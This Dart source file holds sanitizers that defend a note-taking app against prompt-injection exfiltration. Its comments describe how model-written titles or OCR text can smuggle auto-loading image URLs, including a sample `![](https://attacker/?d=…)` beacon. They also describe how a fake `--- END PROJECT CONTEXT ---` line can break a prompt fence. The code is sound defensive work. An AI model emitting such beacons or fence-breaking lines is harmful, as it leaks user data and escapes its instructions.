/// Renders model-authored text into a markdown file the user will open.
///
/// `title` and `summary` are the two fields no human typed: they come back from
/// the enrichment model, which is in turn steered by the capture's own text and
/// by a project file this app read off disk. Every destination then writes them
/// into markdown — a note in the vault, a heading in `inbox.md`, the first line
/// of an agent brief — and the applications that open those files render
/// markdown rather than showing it.
///
/// The construct that matters is the *auto-loading* one. A link waits to be
/// clicked; an image `![](https://…)` and a raw `<img src="…">` are fetched the
/// moment the note is displayed, which turns a title into an outbound request
/// carrying whatever the model was persuaded to put in the query string. That
/// is a beacon out of an app whose whole premise is that it works offline.
///
/// Deliberately narrow. Emphasis, backticks, links and everything else survive
/// untouched: they render as the author meant and none of them reaches the
/// network on their own. Only the two auto-loading forms are defused, and the
/// escape is a markdown escape rather than a deletion, so the title still reads
/// as what the model wrote.
String sanitizeUntrustedMarkdown(String value) => value
    // Newlines first: a title is rendered on one line, and a second line would
    // otherwise escape a `## ` heading or a `> ` quote into body text.
    .replaceAll(RegExp(r'[\r\n]+'), ' ')
    // `\!` is a CommonMark escape, so `![x](url)` degrades to a plain link:
    // still readable, no longer fetched on open.
    .replaceAllMapped(RegExp(r'!(?=\[)'), (Match _) => r'\!')
    // Raw HTML is rendered by Obsidian and by most markdown previews, and
    // `<img>` needs no click either.
    .replaceAll('<', '&lt;')
    .trim();

/// The same defence for a capture's **body**, and a much narrower one.
///
/// The body is not model-authored — it is the processor's output — but for an
/// image capture that is OCR text read off a file somebody else made, so
/// `![](https://attacker/?d=…)` printed on a screenshot ends up in the vault
/// note, in `inbox.md` and in the agent brief exactly as if the user had
/// dictated it.
///
/// It cannot be escaped the way a title is. A body is many lines of text the
/// user may well have dictated *as* markdown, and rewriting `<` or collapsing
/// newlines there would corrupt their own notes. So only the two constructs
/// that reach the network without a click are defused, and only when they point
/// somewhere remote:
///
/// - `![alt](https://…)` degrades to a plain link. A local `![alt](diagram.png)`
///   and the vault's own `![[attachments/…]]` wikilink are left alone — neither
///   leaves the machine.
/// - `<img …>` is the same construct in HTML, which Obsidian renders.
///
/// Everything else — emphasis, code fences, headings, links — survives, because
/// none of it fetches anything on its own.
String sanitizeUntrustedMarkdownBody(String value) => value
    .replaceAllMapped(
      RegExp(r'!(\[[^\]]*\]\(\s*(?:https?:)?//)'),
      (Match match) => '\\!${match[1]}',
    )
    .replaceAllMapped(
      RegExp(r'<(img\b)', caseSensitive: false),
      (Match match) => '&lt;${match[1]}',
    );

/// The replacement text for a line that was shaped like a prompt fence.
const String fenceMarkerReplacement = '[removed: fence marker]';

/// A line shaped like one of the prompt's own fence markers, rewritten so it
/// cannot close the block it sits inside.
///
/// The fence in `_appendContext` is what separates *reference material* from
/// *instructions*, and a fence made of a literal string is only as strong as
/// the guarantee that the fenced text does not contain it. It does not: a
/// `CLAUDE.md` is a file written to brief a model, and one line reading
/// `--- END PROJECT CONTEXT ---` puts everything after it back at the top
/// level of the system prompt, where the standing order not to follow
/// instructions no longer applies to it. A capture's text is the same case
/// with a worse author: it is someone else's audio, an imported file, or OCR
/// of a screenshot, and it sits inside `--- BEGIN CAPTURE TEXT ---`.
///
/// Narrow on purpose. Only a line that *is* a marker is rewritten — a
/// horizontal rule, a YAML front-matter fence and a `--- BEGINNING ---`
/// heading all survive, because the pattern requires `BEGIN` or `END` as a
/// whole word between the dashes.
String defuseFenceMarkers(String value) =>
    value.replaceAll(_fenceMarker, fenceMarkerReplacement);

final RegExp _fenceMarker = RegExp(
  r'^[ \t]*-{3,}[ \t]*(BEGIN|END)\b.*$',
  multiLine: true,
  caseSensitive: false,
);
